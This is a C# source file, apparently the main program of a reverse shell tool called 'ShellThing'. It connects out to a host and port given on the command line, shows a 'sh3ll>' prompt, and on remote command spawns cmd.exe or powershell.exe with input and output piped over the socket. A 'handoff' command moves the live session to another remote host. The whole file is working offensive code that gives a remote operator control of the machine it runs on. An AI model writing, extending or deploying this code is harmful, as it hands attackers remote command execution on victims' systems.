using System;
using System.Collections.Generic;

namespace ShellThing
{
    class Program
    {
        static TcpReverseConnection connection;
        static CommandShell shell;
        static ProcessIoManager processIoManager;
        static string prompt = "sh3ll> ";

        static void Main(string[] args)
        {
            if(args.Length != 2)
            {
                //TODO - Throw an exception or just terminate instead of writing to console
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error - Incorrect Number of arguments");
                Console.ResetColor();
            }
            else
            {
                connection = new TcpReverseConnection();
                connection.StartClient(args[0], args[1]);

                while(connection.IsConnected)
                {
                    connection.SendData(prompt);
                    // TODO: try/catch for ctrl+c close of connection - maybe attempt reconnect??
                    string commandReceived = connection.ReceiveData();
                    try
                    {
                        ExecuteCommand(commandReceived, connection);
                    }
                    catch (Exception e)
                    {
                        connection.SendData($"Exception: {e.Message}");
                    }
                    
                }
            }

            void ExecuteCommand(string commandFullString, TcpReverseConnection connection)
            {
                // Remove newline characters from command string
                commandFullString = commandFullString.Replace("\n", "");

                // Separate any potential parameters and/or flags to commands
                string[] commandSplit = commandFullString.Split(' ');

                // Check if the provided command is valid and if so, call the appropriate function
                switch (commandSplit[0].ToLower())
                {
                    case "shell":
                        SpawnShell(@"cmd.exe");
                        break;
                    case "powershell":
                        SpawnShell(@"powershell.exe");
                        break;
                    case "systeminfo":
                        connection.SendData("SystemInfo\n");
                        break;
                    case "handoff":
                        Handoff(commandSplit);
                        break;
                    default:
                        connection.SendData("Invalid Command\n");
                        break;
                }
            }

            void SpawnShell(string shellType)
            {
                shell = new CommandShell(shellType);
                processIoManager = new ProcessIoManager(shell.Process, connection);

                // Subscribe to events for stdout and stderr being read from target process
                processIoManager.StdoutTextRead += new StringReadEventHandler(OnStdOutRead);
                processIoManager.StderrTextRead += new StringReadEventHandler(OnStdErrRead);

                shell.ProcessTerminated += new ProcessTerminatedEventHandler(OnProcessTerminated);
                shell.StartProcess();
                processIoManager.StartProcessOutputRead();

                // continuously write from connection.ReceiveData() to stdin of target process
                while (shell.Process.HasExited == false)
                {
                    processIoManager.WriteStdIn();
                }            
            }

            void Handoff(string[] commandArguments)
            {
                //Validate arguments
                if (commandArguments.Length != 3)
                {
                    connection.SendData("Handoff error - incorrect number of arguments supplied\n");
                }
                else
                {
                    TcpReverseConnection handoffConnection = new TcpReverseConnection();
                    string ipString = commandArguments[1];
                    string portString = commandArguments[2];

                    try
                    {
                        handoffConnection.StartClient(ipString, portString);
                    }
                    catch (Exception e)
                    {
                        connection.SendData($"Handoff - Exception Starting new socket client: {e.Message}");
                    }

                    // Sign off and close down current connection
                    connection.SendData("[+] New connection established successfully. Closing connection...");
                    connection.StopClient();

                    // Transfer shell I/O to the new connection
                    connection = handoffConnection;
                }
            }

            void OnStdOutRead(string text)
            {
                connection.SendData(text);
            }

            void OnStdErrRead(string text)
            {
                connection.SendData(text);
            }

            void OnProcessTerminated(object source, EventArgs e)
            {
                processIoManager.StopMonitoringProcessOutput();
                processIoManager.ContinueWriteToStdIn = false;
            }
        }
    }
}
